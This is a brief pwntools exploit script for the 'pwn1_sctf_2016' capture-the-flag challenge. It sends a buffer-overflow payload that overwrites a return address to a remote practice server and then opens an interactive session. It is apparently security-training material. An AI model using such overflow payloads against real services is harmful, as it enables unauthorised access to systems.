from pwn import *
#io =  process("./pwn1_sctf_2016")
io = remote("node3.buuoj.cn",26282)
payload = b"I"*20+b"bbbb"+p32(0x8048f0d)

io.sendline(payload)
io.interactive()












